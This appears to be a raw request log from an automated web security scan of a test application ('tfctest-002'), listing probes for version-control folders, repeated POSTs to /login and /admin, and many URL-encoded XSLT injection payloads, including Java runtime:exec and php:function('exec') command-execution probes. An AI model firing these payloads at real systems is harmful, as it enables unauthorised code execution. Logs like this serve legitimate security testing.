5547,Mon Sep 07 03:12:37 BDT 2026,Mon Sep 07 03:12:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_framework/blazor.boot.json,404,Not Found,533,436,1090
5548,Mon Sep 07 03:12:38 BDT 2026,Mon Sep 07 03:12:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.hg,404,Not Found,516,436,1090
5549,Mon Sep 07 03:12:38 BDT 2026,Mon Sep 07 03:12:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.bzr,404,Not Found,549,436,1090
5550,Mon Sep 07 03:12:39 BDT 2026,Mon Sep 07 03:12:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/._darcs,404,Not Found,506,436,1090
5551,Mon Sep 07 03:12:39 BDT 2026,Mon Sep 07 03:12:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/BitKeeper,404,Not Found,977,436,1090
5552,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:41 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,556,437,93
5553,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,1033,534,49517
5554,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3C,200,OK,509,428,979
5555,Mon Sep 07 03:12:41 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,505,437,93
5556,Mon Sep 07 03:12:41 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1171,437,93
5557,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1211,437,93
5558,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1211,437,93
5559,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1211,437,93
5560,Mon Sep 07 03:12:41 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1381,437,93
5561,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,499,361,9
5562,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,531,437,92
5563,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,497,361,9
5564,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,889,437,93
5565,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,516,428,979
5566,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,877,437,93
5567,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,891,437,93
5568,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,517,437,93
5569,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,917,437,93
5570,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1078,437,93
5571,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,504,361,9
5572,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,538,437,93
5573,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,894,437,92
5574,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,886,437,92
5575,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,532,428,979
5576,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,881,437,92
5577,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,896,437,92
5578,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,509,437,93
5579,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1156,437,92
5580,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,517,437,93
5581,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,864,437,93
5582,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,886,437,93
5583,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,876,437,93
5584,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,822,437,93
5585,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1081,437,93
5586,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,511,428,979
5587,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,539,437,93
5588,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,878,437,93
5589,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,795,437,93
5590,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,879,437,93
5591,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,865,437,93
5592,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,891,437,93
5593,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,534,428,979
5594,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,888,437,93
5595,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,895,437,93
5596,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,868,437,93
5597,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,895,437,93
5598,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,947,437,93
5599,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,528,428,979
5600,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3C,200,OK,709,429,1036
5601,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,857,437,93
5602,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3C,200,OK,828,429,1033
5603,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,830,437,93
5604,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,862,437,93
5605,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,857,437,93
5606,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,823,437,93
5607,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,833,437,93
5608,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,531,428,979
5609,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,866,437,93
5610,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,880,437,93
5611,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,865,437,93
5612,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,842,437,93
5613,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,662,429,1036
5614,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3C&_rsc=5CB68i4pnAekjehf,200,OK,506,428,274
5615,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,521,435,271
5616,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,839,429,1033
5617,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,541,428,979
5618,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3C,200,OK,493,429,1033
5619,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,545,428,343
5620,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3C,200,OK,521,428,274
5621,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,519,428,308
5622,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3C,200,OK,546,429,1101
5623,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3C,200,OK,546,429,1100
5624,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,669,429,1036
5625,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=5CB68i4pnAekjehf,200,OK,510,428,358
5626,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,519,428,343
5627,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,535,429,1033
5628,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3C,200,OK,488,429,1100
5629,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,860,429,1033
5630,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=5CB68i4pnAekjehf,200,OK,537,428,349
5631,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,498,429,1100
5632,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,499,429,1101
5633,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,661,429,1036
5634,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,542,428,379
5635,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,533,429,1033
5636,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,539,428,308
5637,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,558,429,1100
5638,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,529,428,624
5639,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,533,429,1100
5640,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,555,429,1101
5641,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,941,429,1033
5642,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,529,429,1033
5643,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,539,428,373
5644,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,529,428,358
5645,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,670,429,1036
5646,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,508,429,1100
5647,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,490,429,1100
5648,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,498,429,1101
5649,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%3C,200,OK,474,428,282
5650,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,534,429,1033
5651,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,521,428,349
5652,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,571,429,1100
5653,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,716,429,1036
5654,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,524,429,1100
5655,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,531,429,1101
5656,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,902,429,1033
5657,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,532,428,282
5658,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,529,429,1033
5659,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,497,428,379
5660,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,521,429,1100
5661,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,540,429,1100
5662,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,515,429,1101
5663,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,663,429,1036
5664,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,515,429,1033
5665,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,486,428,624
5666,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,531,428,282
5667,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,518,429,1100
5668,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:55 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,881,429,1033
5669,Mon Sep 07 03:12:55 BDT 2026,Mon Sep 07 03:12:56 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,544,429,1100
